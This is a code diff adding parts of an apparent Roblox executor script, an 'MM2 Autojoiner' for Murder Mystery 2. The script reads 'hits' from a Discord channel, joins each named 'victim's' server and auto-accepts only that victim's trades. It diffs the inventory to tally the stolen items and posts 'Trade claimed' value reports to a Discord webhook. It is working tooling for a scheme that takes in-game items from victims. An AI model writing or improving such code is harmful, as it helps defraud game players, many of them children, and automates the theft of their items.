+-- Only accepts requests from the current hit's victim. All others blocked.
+-- AcceptTrade args: PlaceId * 3, LastOffer token (from UpdateTrade).
+-- MM2 enforces a 6s cooldown before accepting — we wait 7s.
+-- ═══════════════════════════════════════════════════════════════════════
+task.spawn(function()
+    if not alive() then return end
+    local TradeRS = game:GetService("ReplicatedStorage"):WaitForChild("Trade", 20)
+    if not TradeRS then warn("[MM2 Autojoiner] Trade folder not found"); return end
+
+    local lastOffer = nil
+    local inTrade   = false
+    local conns     = {}  -- track connections so old gens don't accumulate
+
+    -- Accept from: current victim OR anyone logged in the webhook channel
+    local function isAllowed(player)
+        local name = type(player) == "string" and player
+                     or (pcall(function() return player.Name end) and player.Name)
+                     or tostring(player)
+        local ch = getgenv()._aj_currentHit
+        if ch and ch.playerName == name then return true end
+        return getgenv()._aj_knownPlayers[name] == true
+    end
+
+    -- Disconnect all trade listeners when this generation dies (prevents accumulation across teleports)
+    task.spawn(function()
+        while alive() do task.wait(5) end
+        for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
+    end)
+
+    -- Track the LastOffer token needed by AcceptTrade
+    table.insert(conns, TradeRS.UpdateTrade.OnClientEvent:Connect(function(data)
+        if not alive() then return end
+        if data then lastOffer = data.LastOffer end
+    end))
+
+    -- Inventory snapshot helpers for claimed-item detection
+    local function snapInventory()
+        local snap = {}
+        pcall(function()
+            local inv = game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(LP.Name)
+            local db  = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+            for id, cnt in pairs((inv and inv.Weapons and inv.Weapons.Owned) or {}) do
+                if (cnt or 0) > 0 then
+                    local d = db[id]
+                    snap[id] = { count = cnt, name = (d and d.ItemName) or id }
+                end
+            end
+        end)
+        return snap
+    end
+
+    local preTradeSnap = nil
+
+    -- Accept trade requests from victim / webhook-known players; explicitly decline others
+    -- so their pending request doesn't block the victim's trade from coming through.
+    pcall(function()
+        TradeRS.SendRequest.OnClientInvoke = function(sender)
+            if not isAllowed(sender) then
+                task.delay(0.1, function()
+                    pcall(function() TradeRS.DeclineRequest:FireServer() end)
+                end)
+                return false
+            end
+            -- Snapshot inventory before trade starts so we can diff after
+            task.spawn(function() preTradeSnap = snapInventory() end)
+            getgenv()._aj_lastTradeTime = os.time()
+            setAction("Trade request accepted from " .. tostring(sender))
+            task.delay(0.5, function()
+                pcall(function() TradeRS.AcceptRequest:FireServer() end)
+            end)
+            return true
+        end
+    end)
+
+    -- Backup: event path (some servers use FireClient instead of InvokeClient)
+    TradeRS.RequestSent.OnClientEvent:Connect(function(sender)
+        if not isAllowed(sender) then
+            task.delay(0.1, function()
+                pcall(function() TradeRS.DeclineRequest:FireServer() end)
+            end)
+            return
+        end
+        task.spawn(function() preTradeSnap = snapInventory() end)
+        getgenv()._aj_lastTradeTime = os.time()
+        task.wait(0.5)
+        pcall(function() TradeRS.AcceptRequest:FireServer() end)
+    end)
+
+    -- Trade opened: wait out the 6s cooldown, then confirm
+    table.insert(conns, TradeRS.StartTrade.OnClientEvent:Connect(function(tradeData, partnerName)
+        if not isAllowed(partnerName) then return end
+        if tradeData then lastOffer = tradeData.LastOffer end
+        inTrade = true
+        getgenv()._aj_lastTradeTime = os.time()
+        task.wait(7)
+        if not inTrade then return end
+        -- Wait up to 10s for UpdateTrade to supply lastOffer if StartTrade didn't
+        if lastOffer == nil then
+            local waited = 0
+            repeat task.wait(0.5); waited = waited + 0.5
+            until lastOffer ~= nil or waited >= 10 or not inTrade
+        end
+        if not inTrade or lastOffer == nil then
+            warn("[AJ] AcceptTrade aborted — lastOffer is nil after wait")
+            return
+        end
+        setAction("AcceptTrade fired — waiting for server confirm")
+        pcall(function()
+            TradeRS.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
+        end)
+    end))
+
+    -- Trade completed: detect received items via inventory diff, update stats, log webhook
+    table.insert(conns, TradeRS.AcceptTrade.OnClientEvent:Connect(function(success)
+        if not success then return end
+        inTrade = false
+        getgenv()._aj_lastTradeTime = os.time()
+
+        -- Diff inventory to find what we actually received
+        task.spawn(function()
+            task.wait(3)  -- wait for server to update inventory after trade
+            local postSnap = snapInventory()
+            local snap = preTradeSnap or {}
+            preTradeSnap = nil
+
+            local receivedItems = {}
+            local mmValCache = getgenv()._aj_mmValCache
+            local allV = (mmValCache and mmValCache.allV) or {}
+
+            for id, info in pairs(postSnap) do
+                local before = snap[id] and snap[id].count or 0
+                local gained = info.count - before
+                if gained > 0 then
+                    local itemName = info.name
+                    local val = (allV[nrm(itemName)] or 0) * gained
+                    table.insert(receivedItems, { name = itemName, amount = gained, value = val })
+                    logMsg("Got: " .. itemName .. " x" .. gained .. " (" .. commaNum(val) .. " value)")
+                    getgenv()._aj_lastWeapon = { name = itemName, amount = gained, value = val, ts = os.time() }
+                end
+            end
+
+            local totalVal = 0
+            for _, it in ipairs(receivedItems) do totalVal = totalVal + it.value end
+            getgenv()._aj_sessionVal = (getgenv()._aj_sessionVal or 0) + totalVal
+            getgenv()._aj_sessionHits = (getgenv()._aj_sessionHits or 0) + (#receivedItems > 0 and 1 or 0)
+
+            -- Store last claim info for !lastclaim command
+            local ch = getgenv()._aj_currentHit
+            getgenv()._aj_lastClaimTime = os.time()
+            getgenv()._aj_sessionClaims = (getgenv()._aj_sessionClaims or 0) + 1
+            getgenv()._aj_lastClaimInfo = {
+                playerName = ch and ch.playerName or "Unknown",
+                items      = receivedItems,
+                totalVal   = totalVal,
+            }
+            setAction("✅ Trade claimed from " .. (ch and ch.playerName or "?") .. " — +" .. commaNum(totalVal) .. " value")
+
+            if logid and logid ~= "" then
+                local lines = {}
+                for _, it in ipairs(receivedItems) do
+                    table.insert(lines, it.name .. " x" .. it.amount .. "  (" .. commaNum(it.value) .. " value)")
+                end
+                local desc = #lines > 0 and table.concat(lines, "\n") or "items transferred (no diff)"
+                pcall(function()
+                    request({
+                        Url     = logid,
+                        Method  = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body    = HttpService:JSONEncode({
+                            embeds = {{
+                                color       = 0x2ECC71,
+                                title       = "✅ Trade claimed · +" .. commaNum(totalVal) .. " value",
+                                description = "```\n" .. desc .. "\n```",
+                                fields      = {
+                                    { name = "From",          value = ch and ch.playerName or "Unknown",                        inline = true },
+                                    { name = "Session Total", value = commaNum(getgenv()._aj_sessionVal or 0) .. " value", inline = true },
+                                },
+                                timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
+                            }}
+                        })
+                    })
+                end)
+            end
+
+        end)  -- end task.spawn
+    end))
+    table.insert(conns, TradeRS.DeclineTrade.OnClientEvent:Connect(function()
+        inTrade = false
+        preTradeSnap = nil
+    end))
+
+    -- Race-condition guard: if a trade request arrived BEFORE our listeners were
+    -- ready (transferer sends fast after join), catch it by polling GetTradeStatus once.
+    task.spawn(function()
+        task.wait(1)
+        if not alive() then return end
+        pcall(function()
+            local status = TradeRS.GetTradeStatus:InvokeServer()
+            if status == "ReceivingRequest" then
+                warn("[AJ] Pending request detected on setup — accepting")
+                task.spawn(function() preTradeSnap = snapInventory() end)
+                getgenv()._aj_lastTradeTime = os.time()
+                task.delay(0.3, function()
+                    pcall(function() TradeRS.AcceptRequest:FireServer() end)
+                end)
+            end
+        end)
+    end)
+end)
+
+-- (claimed item watcher removed — autojoiner uses inventory diff instead)
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- MAIN JOIN LOOP
+-- Move on when:
+--   1. Victim leaves the server  (checked after 10s grace period)
+--   2. No trade activity for 60 seconds (from join or last trade)
+-- ═══════════════════════════════════════════════════════════════════════
+task.spawn(function()
+    -- State recovery: if getgenv was wiped by the executor's auto-rerun,
+    -- match game.JobId against recent Discord embeds to find our target.
+    -- Runs here (inside task.spawn) so it never blocks the main thread or WindUI.
+    if not getgenv()._aj_currentHit and chanelid ~= "" then
+        pcall(function()
+            local detected = detectCurrentHit()
+            if detected then
+                getgenv()._aj_currentHit    = detected
+                getgenv()._aj_inServerSince = os.time()
+                getgenv()._aj_lastTradeTime = os.time()
+                getgenv()._aj_done          = false
+                getgenv()._aj_doneReason    = ""
+                visited[detected.jobId]     = true
+                warn("[AJ] Recovered target: " .. detected.playerName)
+            end
+        end)
+    end
+
+    -- Give the server time to fully load on first spawn after teleport
+    if getgenv()._aj_currentHit then task.wait(8) end
+
+    while alive() do
+        task.wait(1)
+        if paused then continue end
+
+        local ch = getgenv()._aj_currentHit
+
+        if ch and not getgenv()._aj_done then
+            local timeInServer = os.time() - (getgenv()._aj_inServerSince or os.time())
+
+            -- Condition 1: victim left (only check after 10s so server has time to populate)
+            -- ch.playerName is already the clean username (age suffix stripped in parseHit)
+            if timeInServer >= 10 and Players:FindFirstChild(ch.playerName) == nil then
+                getgenv()._aj_done       = true
+                getgenv()._aj_doneReason = "Victim left"
+                setAction("⚠️ Victim left — moving on")
+            end
+
+            -- Condition 2: victim present but no trade activity for 90s
+            -- Reset timer while victim is in server so we don't bail mid-round.
+            -- Only count down when victim is actually here and no active trade.
+            local lastT = getgenv()._aj_lastTradeTime or 0
+            if Players:FindFirstChild(ch.playerName) ~= nil then
+                -- victim still here — keep resetting if no trade has started yet
+                if lastT == 0 then
+                    getgenv()._aj_lastTradeTime = os.time()
+                end
+            end
+            if lastT > 0 and os.time() - lastT >= 90 then
+                getgenv()._aj_done       = true
+                getgenv()._aj_doneReason = "No trade for 90s"
+            end
+        end
+
+        -- Clear state and immediately look for next hit
+        if getgenv()._aj_done and ch then
+            local reason = getgenv()._aj_doneReason
+            logMsg("Done: " .. ch.playerName .. " — " .. (reason ~= "" and reason or "moving on"))
+            pcall(function()
+                WindUI:Notify({ Title = "Moving on", Desc = reason ~= "" and reason or "Done", Icon = "arrow-right", Duration = 2 })
+            end)
+            getgenv()._aj_claimedTotal  = 0
+            getgenv()._aj_currentHit    = nil
+            getgenv()._aj_done          = false
+            getgenv()._aj_doneReason    = ""
+            getgenv()._aj_inServerSince = 0
+            getgenv()._aj_lastTradeTime = 0
+        end
+
+        -- Jump to the highest-value queued hit immediately.
+        -- Loop through stale hits without waiting so we land on a live one fast.
+        if not getgenv()._aj_currentHit and #hitQueue > 0 then
+            local next = dequeue()
+            while next do
+                if isHitStillLive(next) then
+                    logMsg("Joining: " .. next.playerName .. " · " .. commaNum(next.value) .. " value")
+                    setAction("🚀 Joining " .. next.playerName .. " (" .. commaNum(next.value) .. " value)")
+                    pcall(function()
+                        WindUI:Notify({
+                            Title = "Joining",
+                            Desc  = next.playerName .. " · " .. commaNum(next.value) .. " value",
+                            Icon  = "log-in", Duration = 4,
+                        })
+                    end)
+                    getgenv()._aj_currentHit = next
+                    joinServer(next)
+                    task.wait(10)
+                    getgenv()._aj_teleporting = false
+                    break
+                else
+                    logMsg("Skip: " .. next.playerName .. " — Left Server")
+                    getgenv()._aj_lastFailedHit = next
+                    next = dequeue()
+                end
+            end
+        end
+    end
+end)
+
+-- ═══════════════════════════════════════════════════════════════════════
+-- START — derive chanelid from webhookurl if not set directly
+-- ═══════════════════════════════════════════════════════════════════════
+if (chanelid == "" or not chanelid) and webhookurl and webhookurl ~= "" then
+    pcall(function()
+        local res = request({ Url = webhookurl, Method = "GET" })
+        if res and res.StatusCode == 200 and res.Body then
+            local wh = HttpService:JSONDecode(res.Body)
+            if wh and wh.channel_id then chanelid = tostring(wh.channel_id) end
+        end
+    end)
+end
+if not chanelid or chanelid == "" then
+    warn("[MM2 Autojoiner] Could not resolve channel ID from webhook. Set chanelid manually.")
+end
+if logid == "" then logid = webhookurl end
+
+startGateway()
+
+-- Pre-load mm2values.com cache in background so item values in trade webhooks are never 0.
+task.spawn(function()
+    if getgenv()._aj_mmValCache and (os.time() - (getgenv()._aj_mmValCache.ts or 0)) < 1800 then return end
+    local allV, chrV = {}, {}
+    local pages = {
+        { url = "https://www.mm2values.com/?p=godly",   chroma = false },
+        { url = "https://www.mm2values.com/?p=ancient",  chroma = false },
+        { url = "https://www.mm2values.com/?p=unique",   chroma = false },
+        { url = "https://www.mm2values.com/?p=vintage",  chroma = false },
+        { url = "https://www.mm2values.com/?p=chroma",   chroma = true  },
+    }
+    local done = 0
+    for _, pg in ipairs(pages) do
+        task.spawn(function()
+            pcall(function()
+                local ok, res = pcall(request, { Url = pg.url, Method = "GET", Headers = { ["User-Agent"] = "Mozilla/5.0" } })
+                if not ok or not res then return end
+                local body = res.Body or ""
+                if pg.chroma then
+                    for name, raw in body:gmatch("class='chroma%-text'>([^<]+)</div></b> Value: ([%d,]+)") do
+                        local val = tonumber((raw:gsub(",", "")))
+                        if val then chrV[nrm(name:gsub("^[Cc]hroma ", ""))] = val end
+                    end
+                else
+                    for name, raw in body:gmatch("<b>([^<]+)</b><br> Value: ([%d,]+)") do
+                        local val = tonumber((raw:gsub(",", "")))
+                        if val then allV[nrm(name)] = val end
+                    end
+                end
+            end)
+            done = done + 1
+        end)
+    end
+    local polls = 0
+    while done < #pages and polls < 100 do task.wait(0.2); polls = polls + 1 end
+    if next(allV) then
+        getgenv()._aj_mmValCache = { allV = allV, chrV = chrV, ts = os.time() }
+        warn("[AJ] Value cache loaded")
+    end
+end)
